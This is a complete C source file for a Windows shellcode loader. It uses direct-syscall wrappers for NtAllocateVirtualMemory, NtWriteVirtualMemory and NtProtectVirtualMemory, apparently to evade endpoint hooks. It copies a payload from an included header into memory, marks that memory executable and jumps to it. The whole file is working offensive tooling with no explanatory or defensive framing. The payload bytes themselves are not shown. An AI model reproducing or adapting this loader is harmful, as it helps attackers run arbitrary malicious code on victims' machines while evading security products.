#include <windows.h>
#include <stdio.h> 
#include "Payload.h"

extern NTSTATUS NTAPI Sys_NtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG PageProtection
);

extern NTSTATUS NTAPI Sys_NtWriteVirtualMemory(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

extern NTSTATUS NTAPI Sys_NtProtectVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtection,
    PULONG OldProtection
);

#define NT_SUCCESS(Status)  (((NTSTATUS)(Status)) >= 0)


int main( void ) {

    NTSTATUS status;
    PVOID baseAddress = NULL;
    SIZE_T regionSize = ( SIZE_T )payloadSize;
    status = Sys_NtAllocateVirtualMemory(
        GetCurrentProcess(),
        &baseAddress, 0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if ( !NT_SUCCESS( status ) ) {
        fprintf( stderr, "[-] Failed to allocate memory: 0x%X\n", status );
        return 1;
    }

    printf( "[+] Allocated %d bytes at %p\n", payloadSize, baseAddress );

    SIZE_T bytesWritten;
    status = Sys_NtWriteVirtualMemory(
        GetCurrentProcess(),
        baseAddress,
        payload,
        payloadSize,
        &bytesWritten
    );

    if ( !NT_SUCCESS( status ) ) {
        fprintf( stderr, "[-] Failed to write memory: 0x%X\n", status );
        return 1;
    }

    printf( "[+] Written %lld bytes at %p\n", bytesWritten, baseAddress );


    ULONG oldProtection;
    status = Sys_NtProtectVirtualMemory(
        GetCurrentProcess(),
        &baseAddress,
        &regionSize,
        PAGE_EXECUTE_READ,
        &oldProtection
    );

    if ( !NT_SUCCESS( status ) ) {
        fprintf( stderr, "[-] Failed to change memory protection: 0x%X\n", status );
        return 1;
    }

    ( ( void ( * )( ) )baseAddress )( );

    return 0;
}

